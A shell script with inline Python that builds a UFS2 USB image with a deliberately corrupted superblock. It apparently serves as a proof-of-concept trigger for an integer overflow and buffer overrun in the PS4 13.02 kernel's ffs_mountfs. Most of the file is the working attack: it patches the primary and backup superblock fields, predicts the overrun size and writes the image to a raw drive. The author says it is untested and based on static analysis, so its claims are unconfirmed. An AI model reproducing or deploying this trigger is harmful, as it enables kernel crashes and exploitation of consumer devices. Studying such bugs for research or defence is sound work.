#!/bin/sh
# setup_usb.sh — Fahrenheit UFS2 test image builder
#
# Creates a UFS2 filesystem image with a crafted superblock that should
# trigger the integer overflow in ffs_mountfs on PS4 13.02, then writes
# it to a USB drive.
#
# Usage:
#   sudo ./setup_usb.sh <device>              # valid image (probe test)
#   sudo ./setup_usb.sh <device> --crafted    # crafted image (overflow)
#
# Example:
#   sudo ./setup_usb.sh /dev/sdb
#   sudo ./setup_usb.sh /dev/sdb --crafted
#
# WARNING — READ FIRST
#
# This script has NOT been tested against a PS4. The crafted superblock is
# derived from static analysis of ffs_mountfs on 13.02. Running the
# resulting drive on a console may:
#   - produce no observable behaviour (automounter does not probe UFS)
#   - reject cleanly (mount path rejects before the write loop)
#   - panic the kernel (overflow fired)
#
# On a retail console without a UART or a USB protocol analyzer, none of
# these outcomes are distinguishable. Do not run this against a console
# you cannot afford to lose.
#
# Requirements:
#   - Linux host with mkfs.ufs2 (from freebsd-tools or the FreeBSD source)
#   - dd, python3
#   - A USB 3.0 drive of 250 GB or larger
#   - Root (for writing to the raw device)
#
# The 250 GB floor is not arbitrary — the PS4 automounter rejects smaller
# or slower devices before probing the filesystem. A 32 GB flash drive is
# never probed and produces no observable effect.

set -e

# ---------------------------------------------------------------------------
# Argument handling
# ---------------------------------------------------------------------------

DEVICE="$1"
MODE="${2:-valid}"

if [ -z "$DEVICE" ]; then
    echo "Usage: $0 <device> [--crafted]"
    echo "Example: $0 /dev/sdb"
    echo "         $0 /dev/sdb --crafted"
    exit 1
fi

if [ ! -b "$DEVICE" ]; then
    echo "Error: $DEVICE is not a block device"
    exit 1
fi

if [ "$(id -u)" -ne 0 ]; then
    echo "Error: must run as root"
    exit 1
fi

# Check device size (250 GB minimum)
DEV_SIZE_BYTES=$(blockdev --getsize64 "$DEVICE" 2>/dev/null || echo 0)
DEV_SIZE_GB=$((DEV_SIZE_BYTES / 1000000000))
if [ "$DEV_SIZE_GB" -lt 250 ]; then
    echo "Warning: $DEVICE is ${DEV_SIZE_GB} GB, below the 250 GB automounter floor."
    echo "         The PS4 is unlikely to probe it for a filesystem."
    echo "         Press Enter to continue anyway, Ctrl-C to abort."
    read -r _
fi

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------

IMG_SIZE_MB=512
IMG_FILE="/tmp/fahrenheit_ufs2.img"
SBLOCK_OFFSET=65536                # UFS2 superblock lives at byte 65536

# ---------------------------------------------------------------------------
# Formatting tool discovery
# ---------------------------------------------------------------------------

if command -v mkfs.ufs2 >/dev/null 2>&1; then
    MKFS_CMD="mkfs.ufs2"
elif command -v newfs >/dev/null 2>&1; then
    MKFS_CMD="newfs -O 2"
elif command -v mkfs.ufs >/dev/null 2>&1; then
    MKFS_CMD="mkfs.ufs -O 2"
else
    echo "Error: no UFS2 formatting tool found."
    echo "       Install freebsd-tools:  sudo apt install freebsd-tools"
    echo "       Or build newfs from the FreeBSD source tree."
    exit 1
fi

echo "[*] Using formatter: $MKFS_CMD"

# ---------------------------------------------------------------------------
# Build the image
# ---------------------------------------------------------------------------

echo "[*] Creating ${IMG_SIZE_MB} MB image at $IMG_FILE"
dd if=/dev/zero of="$IMG_FILE" bs=1M count=$IMG_SIZE_MB status=progress

echo "[*] Formatting as UFS2"
# Different toolchains accept different flags. Try the FreeBSD-style
# invocation first, then fall back to a plain format.
if ! $MKFS_CMD -b 65536 -f 8192 "$IMG_FILE" 2>/dev/null; then
    if ! $MKFS_CMD "$IMG_FILE" 2>/dev/null; then
        echo "Error: could not create UFS2 filesystem"
        rm -f "$IMG_FILE"
        exit 1
    fi
fi

# ---------------------------------------------------------------------------
# Craft the superblock
# ---------------------------------------------------------------------------

if [ "$MODE" = "--crafted" ]; then
    echo ""
    echo "[*] Crafting superblock for field relationship violation"
    echo ""

    python3 << 'PYEOF'
import struct
import sys

img = "/tmp/fahrenheit_ufs2.img"
SBLOCK_OFFSET = 65536

try:
    f = open(img, 'r+b')
except IOError as e:
    print("  [!] could not open image:", e)
    sys.exit(1)

# Read the primary superblock
f.seek(SBLOCK_OFFSET)
sb = bytearray(f.read(8192))

# Verify UFS2 magic at offset 0x55c within the superblock
magic = struct.unpack_from('<I', sb, 0x55c)[0]
if magic != 0x19540119:
    print("  [!] Warning: magic is 0x%08x, expected 0x19540119" % magic)
    print("  [!] The image may not be UFS2. Continuing anyway.")

# --- Crafted field values ---
#
# These create a field relationship violation:
#   fs_bsize != fs_fsize * fs_frag
#
# Result: the write loop's iteration count and per-iteration size do not
# match the allocation, so the total write exceeds the reserved buffer.

fs_bsize = 0x10000    # 64 KB, max allowed by the inline check
fs_fsize = 0x200      # 512 bytes
fs_frag  = 0x8        # 8 fragments
# fs_fsize * fs_frag = 0x1000, but fs_bsize = 0x10000
# Violation factor: 16x

fs_ncg   = 0x1        # 1 cylinder group
field_9c = 0x10000    # cssize = 64 KB
field_524 = 0x1       # enables the +4*fs_ncg path
field_528 = 0x1       # passes the >= 1 check

# Write fields (all little-endian uint32)
struct.pack_into('<I', sb, 0x2c, fs_ncg)
struct.pack_into('<I', sb, 0x30, fs_bsize)
struct.pack_into('<I', sb, 0x34, fs_fsize)
struct.pack_into('<I', sb, 0x38, fs_frag)
struct.pack_into('<I', sb, 0x9c, field_9c)
struct.pack_into('<I', sb, 0x524, field_524)
struct.pack_into('<I', sb, 0x528, field_528)

f.seek(SBLOCK_OFFSET)
f.write(sb)

# --- Backup superblocks ---
# UFS2 keeps backups at fixed offsets. Patch any that carry the magic.

for backup_off in [131072, 262144, 524288, 1048576]:
    try:
        f.seek(backup_off)
        bsb = bytearray(f.read(8192))
        if len(bsb) < 8192:
            continue
        if struct.unpack_from('<I', bsb, 0x55c)[0] == 0x19540119:
            struct.pack_into('<I', bsb, 0x2c, fs_ncg)
            struct.pack_into('<I', bsb, 0x30, fs_bsize)
            struct.pack_into('<I', bsb, 0x34, fs_fsize)
            struct.pack_into('<I', bsb, 0x38, fs_frag)
            struct.pack_into('<I', bsb, 0x9c, field_9c)
            struct.pack_into('<I', bsb, 0x524, field_524)
            struct.pack_into('<I', bsb, 0x528, field_528)
            f.seek(backup_off)
            f.write(bsb)
            print("  [*] patched backup superblock at 0x%x" % backup_off)
    except Exception:
        pass

f.close()

# --- Predicted behaviour ---

print("  [*] Superblock fields written:")
print("      fs_ncg      = 0x%x" % fs_ncg)
print("      fs_bsize    = 0x%x  (%d bytes)" % (fs_bsize, fs_bsize))
print("      fs_fsize    = 0x%x  (%d bytes)" % (fs_fsize, fs_fsize))
print("      fs_frag     = 0x%x" % fs_frag)
print("      field_0x9c  = 0x%x" % field_9c)
print("      field_0x524 = 0x%x" % field_524)
print("      field_0x528 = 0x%x" % field_528)
print("")
print("      fs_fsize * fs_frag = 0x%x" % (fs_fsize * fs_frag))
print("      Violation: fs_bsize (0x%x) != fs_fsize * fs_frag (0x%x)"
      % (fs_bsize, fs_fsize * fs_frag))
print("")

# Predicted arithmetic on 13.02 (32-bit):
iVar24 = (field_9c + fs_fsize - 1) // fs_fsize
K = (iVar24 + fs_frag - 1) // fs_frag
W = K * fs_bsize
A = field_9c + 4 * fs_ncg + fs_ncg
overrun = W - A

print("  [*] Predicted behaviour on 13.02 (32-bit arithmetic):")
print("      iVar24 (loop divisor)  = 0x%x" % iVar24)
print("      K (loop iterations)    = 0x%x" % K)
print("      W (total write bytes)  = 0x%x  (%d bytes)" % (W, W))
print("      A (allocation bytes)   = 0x%x  (%d bytes)" % (A, A))
print("      Overrun                = 0x%x  (%d bytes)" % (overrun, overrun))
print("")
print("  [!] This is a pile-driver overrun. The kernel will panic on")
print("  [!] write. Confirming the trigger fires at all is the point of")
print("  [!] this test — the panic is the observation.")
print("")

PYEOF

    if [ $? -ne 0 ]; then
        echo "Error: superblock crafting failed"
        rm -f "$IMG_FILE"
        exit 1
    fi

    echo "[*] Crafted image ready: $IMG_FILE"
else
    echo ""
    echo "[*] Valid image ready: $IMG_FILE"
    echo ""
    echo "    This image tests whether the automounter probes UFS at all."
    echo "    Plug it in and observe:"
    echo "      - if the console reads the drive (LED blinks), the probe"
    echo "        is happening. UFS may or may not be in the fstype list."
    echo "      - if nothing happens, UFS is not probed on USB."
    echo ""
fi

# ---------------------------------------------------------------------------
# Write to device
# ---------------------------------------------------------------------------

echo "[*] Writing image to $DEVICE"
echo "    WARNING: All data on $DEVICE will be destroyed."
echo "    Press Enter to continue, or Ctrl-C to abort."
read -r _

dd if="$IMG_FILE" of="$DEVICE" bs=1M status=progress conv=fsync
sync

echo ""
echo "[*] Done."
echo ""

if [ "$MODE" = "--crafted" ]; then
    echo "    Expected outcome on the PS4:"
    echo "      - kernel panic / console reboot, if the automounter"
    echo "        probes UFS and the overflow fires"
    echo "      - clean mount rejection, if the mount path rejects the"
    echo "        image before reaching the write loop"
    echo "      - no observable behaviour, if UFS is not probed at all"
    echo ""
    echo "    On retail hardware without UART, all three look similar."
    echo "    Attach UART or a USB protocol analyzer to distinguish."
else
    echo "    Remove the drive, plug it into the PS4, observe."
    echo "    If the console reads the drive but does not mount it,"
    echo "    the probe happened and UFS is likely not in the fstype"
    echo "    list — the crafted image would be pointless."
fi

echo ""
rm -f "$IMG_FILE"